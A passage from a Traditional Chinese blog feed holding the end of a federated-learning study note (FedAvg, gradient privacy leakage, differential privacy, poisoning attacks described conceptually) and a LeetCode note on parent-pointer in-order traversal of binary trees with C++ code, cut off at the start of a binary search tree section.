w - \alpha \cdot g $ (這邊是在進行梯度下降)</strong></li></ol><div class="note info flat"><p>$\alpha$ 為 learning rate</p></div><p>Server的事情做完後，就可以進行下一次的迭代，直到演算法收斂。</p><h1 id="Federated-Averaging-Algorithm-FedAvg"><a href="#Federated-Averaging-Algorithm-FedAvg" class="headerlink" title="Federated Averaging Algorithm (FedAvg)"></a>Federated Averaging Algorithm (FedAvg)</h1><p><img src="/img/Fed/ds3.png"></p><p>與剛才的梯度下降演算法不同的是，這是一種 Communication-Efficient 的演算法。第一步一樣會是 Parameter Server 將 parameter發送給 worker node，但後續步驟就開始有差異了</p><h2 id="Worker-要做的事"><a href="#Worker-要做的事" class="headerlink" title="Worker 要做的事"></a>Worker 要做的事</h2><p>假設現在是第 $i$ 個 worker node</p><ol><li>接收來自 Server 的模型參數 $w$</li><li>重複以下操作:<br>a.  透過模型參數 $w$ 和本地資料計算 gradient $g$<br>b.   在本地做梯度下降: <strong>$w \leftarrow w - \alpha \cdot g$</strong></li></ol><blockquote><p>a. 與 b. 會重複好機個 epoch, <strong>一個 epoch 會是處理一遍本地資料</strong>，所以a,b重複 N 遍就是有 N 的 epoch</p></blockquote><ol start="3"><li>將 $\widetilde{w_{i}} &#x3D; W$ 發送回 Sever， ( 這裡的 $\widetilde{w_{i}}$ 就是在本地進行梯度下降後的 $w$ )</li></ol><p>這樣節點就完成計算</p><h2 id="Server-要做的事"><a href="#Server-要做的事" class="headerlink" title="Server 要做的事"></a>Server 要做的事</h2><ol><li>Server 接收來自 $m$ 個 worker 的:  $\widetilde{w_{i}}$ ~ $\widetilde{w_{m}}$</li><li>做平均或加權平均: <strong>$w \leftarrow \cfrac{1}{m}(\widetilde{w_{i}} + … +\widetilde{w_{m}} ) $</strong></li></ol><p>新的模型參數即為 $m$</p><blockquote><p> 所以梯度下降會是 worker回傳梯度給server去計算模型參數，而FedAvg 會是worker先計算完本地的模型參數直接上傳，Server去做平均</p></blockquote><p><img src="/img/Fed/graph1.png"></p><p>對於相同通訊量來說，FedAvg 的收斂比較快，<strong>FedAvg就是犧牲worker node的計算量換取更少的通訊次數</strong></p><p><img src="/img/Fed/graph2.png"></p><p>對於相同epoch (worker掃完一次資料，用以衡量計算量)來說，FedAvg 的收斂比較慢</p><h3 id="Communication-Efficient-Alogrithms"><a href="#Communication-Efficient-Alogrithms" class="headerlink" title="Communication-Efficient Alogrithms"></a>Communication-Efficient Alogrithms</h3><ul><li>Apporximate Newton’s algorithms</li><li>Primal-dual algorithms</li><li>One-shot averaging</li></ul><p>通訊會是分散式機器學習很大的問題，有許多演算法就是旨在解決通訊次數，但基本上都是用大量的計算換取較少的通訊次數</p><h1 id="隱私保護"><a href="#隱私保護" class="headerlink" title="隱私保護"></a>隱私保護</h1><p>分散式學習或者聯邦學習在架構上僅從本地端上傳了梯度到Server端，而用戶資料留存在本地端，這樣是否就代表用戶隱私式安全的? 其實不然，梯度本身就是用用戶資料透過一個函數計算出來的：</p><p>這裡可以看一下 <strong>Stochastic gradient</strong> 是如何求出來的，首先要知道一個 <strong>Least squares regression</strong> 為:</p><math xmlns="http://www.w3.org/1998/Math/MathML">  <munder>    <mrow data-mjx-texclass="OP">      <mi>m</mi>      <mi>i</mi>      <mi>n</mi>    </mrow>    <mrow data-mjx-texclass="ORD">      <mi>w</mi>    </mrow>  </munder>  <mo data-mjx-texclass="NONE">&#x2061;</mo>  <munderover>    <mo data-mjx-texclass="OP">&#x2211;</mo>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>      <mo>=</mo>      <mn>1</mn>    </mrow>    <mrow data-mjx-texclass="ORD">      <mi>n</mi>    </mrow>  </munderover>  <mi>l</mi>  <mo stretchy="false">(</mo>  <mi>w</mi>  <mo>,</mo>  <msub>    <mi>x</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo>,</mo>  <msub>    <mi>y</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo stretchy="false">)</mo></math><p> where </p><html><math xmlns="http://www.w3.org/1998/Math/MathML">  <mi>l</mi>  <mo stretchy="false">(</mo>  <mi>w</mi>  <mo>,</mo>  <msub>    <mi>x</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo>,</mo>  <msub>    <mi>y</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo stretchy="false">)</mo>  <mo>=</mo>  <mfrac>    <mrow>      <mpadded height="8.6pt" depth="3pt" width="0">        <mrow></mrow>      </mpadded>      <mstyle displaystyle="false" scriptlevel="0">        <mrow data-mjx-texclass="ORD">          <mn>1</mn>        </mrow>      </mstyle>    </mrow>    <mrow>      <mpadded height="8.6pt" depth="3pt" width="0">        <mrow></mrow>      </mpadded>      <mstyle displaystyle="false" scriptlevel="0">        <mrow data-mjx-texclass="ORD">          <mn>2</mn>        </mrow>      </mstyle>    </mrow>  </mfrac>  <mo stretchy="false">(</mo>  <msubsup>    <mi>x</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>    <mrow data-mjx-texclass="ORD">      <mi>T</mi>    </mrow>  </msubsup>  <mi>w</mi>  <mo>&#x2212;</mo>  <msub>    <mi>y</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <msup>    <mo stretchy="false">)</mo>    <mrow data-mjx-texclass="ORD">      <mn>2</mn>    </mrow>  </msup></math></html><p>, </p><math xmlns="http://www.w3.org/1998/Math/MathML">  <msub>    <mi>g</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo>=</mo>  <mfrac>    <mrow>      <mpadded height="8.6pt" depth="3pt" width="0">        <mrow></mrow>      </mpadded>      <mstyle displaystyle="false" scriptlevel="0">        <mrow data-mjx-texclass="ORD">          <mi>&#x2202;</mi>          <mrow data-mjx-texclass="ORD">            <mi>l</mi>            <mo stretchy="false">(</mo>            <mi>w</mi>            <mo>,</mo>            <msub>              <mi>x</mi>              <mrow data-mjx-texclass="ORD">                <mi>i</mi>              </mrow>            </msub>            <mo>,</mo>            <msub>              <mi>y</mi>              <mrow data-mjx-texclass="ORD">                <mi>i</mi>              </mrow>            </msub>            <mo stretchy="false">)</mo>          </mrow>        </mrow>      </mstyle>    </mrow>    <mrow>      <mpadded height="8.6pt" depth="3pt" width="0">        <mrow></mrow>      </mpadded>      <mstyle displaystyle="false" scriptlevel="0">        <mrow data-mjx-texclass="ORD">          <mi>&#x2202;</mi>          <mrow data-mjx-texclass="ORD">            <mi>w</mi>          </mrow>        </mrow>      </mstyle>    </mrow>  </mfrac>  <mo>=</mo>  <mo stretchy="false">(</mo>  <msubsup>    <mi>X</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>    <mrow data-mjx-texclass="ORD">      <mi>T</mi>    </mrow>  </msubsup>  <mi>W</mi>  <mo>&#x2212;</mo>  <msub>    <mi>y</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo stretchy="false">)</mo>  <msub>    <mi>X</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub></math><p>最上面的 $l(w,x_{i},y_{i})$ 是Least squares regression 的 loss function，其定義為資料與模型參數的內積扣掉標籤 $y_{i}$ 然後求平方。而求梯度是對於 $w$ 求導數，得到的會是一個向量，這個向量前面的 </p><math xmlns="http://www.w3.org/1998/Math/MathML">  <mo stretchy="false">(</mo>  <msubsup>    <mi>X</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>    <mrow data-mjx-texclass="ORD">      <mi>T</mi>    </mrow>  </msubsup>  <mi>W</mi>  <mo>&#x2212;</mo>  <msub>    <mi>y</mi>    <mrow data-mjx-texclass="ORD">      <mi>i</mi>    </mrow>  </msub>  <mo stretchy="false">)</mo></math>  會是一個實數， 因此可以看成是對原本的用戶資料 $X_{i}$ 進行伸縮。 所以梯度也只是把原本的資料做了些變換而已，並沒有資料保護的效果。 透過梯度是可以反推出原始資料的，因此會有隱私風險存在。<p>而聯邦學習中，Server 或是 Worker 都能看到每一輪迭代後的模型參數，所以聯邦學習洩漏的隱私更多了。</p><p><img src="/img/Fed/privacy.jpeg"></p><h2 id="要如何防禦"><a href="#要如何防禦" class="headerlink" title="要如何防禦?"></a>要如何防禦?</h2><p>這裡就會提到 <strong>差分隱私(differential privacy)</strong> ，其概念就是加入 <strong>noise</strong>，可以在梯度或模型參數加入noise，但如果 noise 不夠強，還是有可能被逆向出原本資料，但 noise 太強也可能導致 loss function 無法繼續收斂，這樣模型也學不好。</p><h2 id="抵禦拜占庭錯誤和惡意攻擊"><a href="#抵禦拜占庭錯誤和惡意攻擊" class="headerlink" title="抵禦拜占庭錯誤和惡意攻擊"></a>抵禦拜占庭錯誤和惡意攻擊</h2><p>拜占庭錯誤與 <strong>拜占庭問題(Byzantine General Problem)</strong> 有關係，這是一個分散式系統的問題，也就是在分散式系統中如果有一個節點發生錯誤，並且沒有掛掉，那他就會連帶拖累整個系統中的其他節點，可以理解成我們之中出了一個叛徒，如果有一個節點為惡意的，對自己的資料跟標籤進行修改，那他就有機會傳送有問題的梯度到 Server，訓練出有問題的模型。這種攻擊就叫 **<a href="https://ieeexplore.ieee.org/document/9900151">Data Poison Attack</a>**，在傳統神經網路中就能做到，而專門針對分散式機器學習的攻擊為 <strong>Model poisoning attack</strong>，這通常把本地標籤換成錯的，這樣計算出來當然會是錯誤的模型。</p><p>其中一種防禦方法就是 Sever  會拿某個 Worker 上傳的梯度，來更新模型參數，並在Server或測試機上計算準確率，若某個worker傳錯誤的梯度，必然會造成測試準確率下降，但這種防禦方式不太適合聯邦學習。因為 Server無法知道用戶資料，並且worker之間統計分布不太一樣，即便worker不是惡意的也有可能導致準確率下降，並且Server 又會去將模型參數去做平均。</p><p>目前現有防禦方式都是基於用戶資料會是IID (獨立同分布)，但聯邦學習的實際狀況式用戶資料並不是獨立同分布，個別worker統計分布並不一樣，因此現有的防禦方式都並不太實際。</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><ul><li>聯邦學習是一種分散式學習</li><li>目的是用來讓多個用戶合作訓練出模型，但不共享資料，用戶資料不離開本地端。(重點是要保護用戶隱私)</li><li>聯邦式學習的獨特挑戰:<ul><li>non-IID Data</li><li>緩慢的通訊</li></ul></li></ul><p>所以很重要的方向會是:</p><ol><li>建立 Commuincation-Effecient 的演算法</li><li>抵禦資料洩漏 (攻擊容易防禦困難)</li><li>建立機制防止拜占庭錯誤</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://www.youtube.com/watch?v=STxtRucv_zo&t=6s">https://www.youtube.com/watch?v=STxtRucv_zo&amp;t=6s</a><br>[2] <a href="https://zh.wikipedia.org/zh-tw/%E7%8B%AC%E7%AB%8B%E5%90%8C%E5%88%86%E5%B8%83">https://zh.wikipedia.org/zh-tw/%E7%8B%AC%E7%AB%8B%E5%90%8C%E5%88%86%E5%B8%83</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Federated Learning </tag>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 樹 (Tree) | 進階實作篇 | LeetCode 筆記</title>
      <link href="/posts/tree_for_leetcode_2.html"/>
      <url>/posts/tree_for_leetcode_2.html</url>
      
        <content type="html"><![CDATA[<h1 id="In-Order-Traversal-by-Parent-Field"><a href="#In-Order-Traversal-by-Parent-Field" class="headerlink" title="In-Order Traversal by Parent Field"></a>In-Order Traversal by Parent Field</h1><p>在<a href="https://leozzmc.github.io/posts/tree_for_leetcode.html">前一篇介紹 Tree 的文章</a> 中應該有發現，我們在實作 Binary Tree Node 的時候有宣告一個 <code>TreeNode *parent</code> 指標，但卻沒有使用。</p><p>我們在實踐 Inorder Traversal 也可以透過 Parent Field來去進行，若要善用 <code>*parent</code> 進行 Traversal 需要提及兩個重要函式:</p><ul><li><code>InorderSuccessor()</code> : 以 inorder 順序尋找 (LVR) 進行 Traversal 的 <strong>下一個 node</strong></li><li><code>InorderPredecessor()</code>: 以 inorder 順序尋找 (LVR) 進行 Traversal 的 <strong>前一個 node</strong></li></ul><p><img src="/img/LeetCode/tree/new_inorder.png"></p><blockquote><p>這裡提到的概念會與之後的 BST(Binary Search Tree) 有關聯</p></blockquote><p>在實作這兩個函式來實踐 Inorder Traversal 之間還有幾項前置作業必須先完成:</p><ul><li>在 <code>main()</code> 中將不同節點的 <code>*parent</code> 之間串接起來</li><li>在 <code>class BinartTree</code> 中定義六個成員函式</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Link the parent pointers</span></span><br><span class="line">    nodeB -&gt; parent = nodeA;</span><br><span class="line">    nodeC -&gt; parent = nodeA;</span><br><span class="line">    nodeD -&gt; parent = nodeB;</span><br><span class="line">    nodeE -&gt; parent = nodeB;</span><br><span class="line">    nodeG -&gt; parent = nodeE;</span><br><span class="line">    nodeH -&gt; parent = nodeE;</span><br><span class="line">    nodeF -&gt; parent = nodeC;</span><br><span class="line">    nodeI -&gt; parent = nodeF;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// the root is the starting node ot the tree</span></span><br><span class="line">        TreeNode *root; </span><br><span class="line">        <span class="built_in">BinaryTree</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode *node): <span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Preorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Postorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// add 6 new member functions</span></span><br><span class="line">        <span class="function">TreeNode * <span class="title">Leftmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">Rightmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">InorderSuccessor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">InorderPredecessor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder_by_parent</span><span class="params">(TreeNode *root)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder_Reverse</span><span class="params">(TreeNode *root)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Leftmost-and-Successor"><a href="#Leftmost-and-Successor" class="headerlink" title="Leftmost and Successor"></a>Leftmost and Successor</h2><p>前置作業完成後接著就是要個別定義成員函式，首先是 <code>Letfmost()</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::Leftmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊很直觀，就是取得以currentNode為基準，最左的child節點(也就是該 subTree 第一個要訪問的節點)，<strong>如果輸入是root Node，則輸出會是整個 Inorder Traversal 中的起始節點</strong></p><p>接著就是 <code>Successor</code> ，用來尋找 currentNode 的下一個節點。但這樣會有兩種狀況:</p><p><strong>第一種: 若 CurrentNode 的 right child 不是 NULL，則 CurrentNode下一個順序的node 會是 “Current-&gt;rightchild 為 root” 的 subTree 當中最左邊的node</strong> 聽起來很繞口，舉例來說，下圖中的 nodeB 為 CurrentNode 的時候，此時它的 right child 不為 null，因此它的 Successor 會是以 right child 為 root 的 subTree 中最左邊的節點，也就是 nodeG</p><p><strong>第二種: 如果 CurrentNode 沒有 right child，則 CurrentNode 的下一個node 會是 “以 left child 身分找到的 ancestor”</strong> ， 舉例來說，下圖中的 nodeH 並沒有 right child，因此它的 Successor 必定是它的 Ancestor，但必須得是尚未 Visiting 過的 ancestor 節點，由於順序是 inorder (LVR)，因此必須是以 Left child 身分找到得 ancestor 才會是下一個節點。因此nodeH 會找到 nodeA 為 Successor。</p><p><img src="/img/LeetCode/tree/Inorder_by_parent.png"></p><div class="note info flat"><p><strong>特別提醒，在實作第二種狀況的時候，在特定的 Tree 會發生問題，例如只有 left subTree 的 skewed tree，整棵樹都沒有 right subTree，這時就必須回傳 NULL，代表 root 沒有 successor</strong></p></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::InorderSuccessor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Leftmost</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode *Successor = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is succesor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>( Successor != <span class="literal">NULL</span> &amp;&amp; current == Successor-&gt;rightchild)&#123;</span><br><span class="line">        current = Successor;</span><br><span class="line">        Successor = Successor-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Suceessor == NULL or the current node is Successor&#x27;s left child</span></span><br><span class="line">    <span class="keyword">return</span> Successor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了 <code>Leftmost</code> 跟   <code>InorderSuccessor</code> 其實就可以進行 Inorder Traversal 了，整體會合併實現在 <code>Inorder_by_parent</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder_by_parent</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">  TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">  current = <span class="built_in">Leftmost</span>(root);</span><br><span class="line">  <span class="keyword">while</span>(current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">    cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    current= <span class="built_in">InorderSuccessor</span>(current);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此時在 <code>main()</code> 呼叫 <code>T.Inorder_by_parent(T.root)</code> 即可輸出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D B G E H A F I C </span><br></pre></td></tr></table></figure><h2 id="Rightmost-and-Predecessor"><a href="#Rightmost-and-Predecessor" class="headerlink" title="Rightmost and Predecessor"></a>Rightmost and Predecessor</h2><p><code>Rightmost</code> 以及 <code>Predecessor</code> 和 <code>Leftmost</code> 跟 <code>Successor</code> 的概念相近，幾乎就是 left right 互換而已:</p><p><strong>Rightmost 要做的事就是以 CurrentNode 為 root 找到 subtree 中最右邊的節點</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::Rightmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 Predecessor 代表 CurrentNode 的前一個節點，其位置跟 Successor 一樣有兩種可能:</p><p><strong>第一種: 若 CurrentNode 的 leftchild 不為 null，則 CurrentNode 的上一個節點會是以 CurrentNode-&gt;leftchild 為 root 的 subTree 中最右邊的 node</strong>。 舉例來說，下圖中 nodeC的 Predecessor 就會是以 nodeF (L) 為 root 之 subTree 的最右邊節點，也就是 nodeI。</p><p><strong>第二種: 若 CurrentNode 沒有 leftchild，則 CurrentNode 的前一個 node 會是 “以right child 身分找到的 ancestor”</strong> 。舉例來說，下圖中 nodeF 並沒有 leftchild，因此按照 Inorder 順序 (LVR)，它的上一個節點必定為它的 ancestor，但會是已經拜訪過的 ancestor，因此尋找到 ancestor 的身分必定會是 rightchild，引此 nodeF 以 leftchild 身分找到的 ancestor nodeC 並不是它的 Predecessor，因此繼續往上找到 nodeA，即為它的 Predecessor。</p><p><img src="/img/LeetCode/tree/Inorder_by_Parent_2.png"></p><div class="note info flat"><p><strong>特別提醒，跟 Successor 一樣，在實作第二種狀況的時候，在特定的 Tree 會發生問題，例如只有 right subTree 的 skewed tree，整棵樹都沒有 left subTree，這時就必須回傳 NULL，代表 root 沒有 predecessor</strong></p></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::InorderPredecessor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Rightmost</span>(current-&gt;leftchild);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TreeNode *Predecessor = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is not predecessor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>(Predecessor != <span class="literal">NULL</span> &amp;&amp; current == Predecessor-&gt;leftchild)&#123;</span><br><span class="line">        current = Predecessor;</span><br><span class="line">        Predecessor = Predecessor-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Predecesor == NULL or current node is predecessor&#x27;s right child.</span></span><br><span class="line">    <span class="keyword">return</span> Predecessor;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>透過 <code>rightmost</code> 和 <code>InorderPredecessor</code> 即可完成針對Binart Tree 的反向 Inorder Traversal。可以透過 <code>Inorder_Reverse</code> 來實現</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder_Reverse</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">    TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">    current = <span class="built_in">rightmost</span>(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(current)&#123;</span><br><span class="line">        std::cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        current = <span class="built_in">InorderPredecessor</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此時在 <code>main()</code> 中呼叫 <code>T.Inorder_Reverse(T.root)</code> 即可得到 Tree 節點的反向 Inorder 輸出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C I F A H E G B D</span><br></pre></td></tr></table></figure><blockquote><p>完整程式碼可以看我的 <strong><a href="https://github.com/leozzmc/Leetcode/blob/main/Tree/Binary_Tree-2.cpp">GitHub</a></strong></p></blockquote><h3 id="重新建構-Binary-Tree"><a href="#重新建構-Binary-Tree" class="headerlink" title="重新建構 Binary Tree"></a>重新建構 Binary Tree</h3><!-- https://alrightchiu.github.io/SecondRound/binary-tree-jian-li-yi-ke-binary-tree.html --><p>前一篇暴力建構Binary Tree 其實是有些存取安全問題的，因為定義的 pointer 都放 <code>public</code>，目的是為了能夠讓 main存取，接下來會進行一些改動，也就是把 pointer 放入 <code>private</code> 區塊中。 </p><h1 id="Binary-Search-Tree-BST"><a href="#Binary-Search-Tree-BST" class="headerlink" title="Binary Search Tree(BST)"></a>Binary Search Tree(BST)</h1><!-- https://alrightchiu.github.io/SecondRound/binary-search-tree-searchsou-xun-zi-liao-insertxin-zeng-zi-liao.html --><!-- https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao --><h2 id="甚麼是-Binary-Search-Tree"><a href="#甚麼是-Binary-Search-Tree" class="headerlink" title="甚麼是 Binary Search Tree?"></a>甚麼是 Binary Search Tree?</h2><blockquote><p>Binary Search Tree 是一種 Binary Tree，它的節點滿足一個特性的順序: 所有左子樹節點 &lt;&#x3D; n &lt; 右子樹節點，對於每個節點 n 都要成立，也就代表對節點的所有後代，這個不等式都要成立</p></blockquote><p><img src="/img/LeetCode/tree/BST.png"></p><div class="note info flat"><p>上面定義中的等式部分可能會有所不同，某些定義中樹不可以有重複值，或者重複值會位在右側，所以還是要回歸到題目定義。</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">對任一節點R，以其左節點為根的子樹(左子樹)的所有節點必小於R</span><br><span class="line">對任一節點R，以其右節點為根的子樹(右子樹)的所有節點必大於R</span><br><span class="line">以子樹中任一子節點為根的子樹也都符合上述定義</span><br></pre></td></tr></table></figure><p>滿足上面定義的也稱作 <strong>Normal Binary Search Tree</strong>，而具有其他特性的 BST，像紅黑樹就以後再討論。 </p><h2 id="建構-Binary-Search-Tree"><a href="#建構-Binary-Search-Tree" class="headerlink" title="建構 Binary Search Tree"></a>建構 Binary Search Tree</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span 